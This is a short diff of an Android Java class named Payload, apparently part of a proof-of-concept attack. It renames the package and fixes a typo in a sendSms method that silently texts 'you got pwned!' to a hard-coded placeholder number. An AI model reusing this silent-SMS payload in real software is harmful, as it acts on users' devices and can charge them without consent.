@@ -1,4 +1,4 @@
-package android.chips.payload;
+package com.chips.payload;
 
 import android.content.ContentResolver;
 import android.content.Context;
@@ -52,7 +52,7 @@ public class Payload {
 
     public static void sendSms(Context context) {
         String phoneNumber = "+123456789";
-        String message = "you got pawned!";
+        String message = "you got pwned!";
         SmsManager sms = SmsManager.getDefault();
         sms.sendTextMessage(phoneNumber, null, message, null, null);
     }
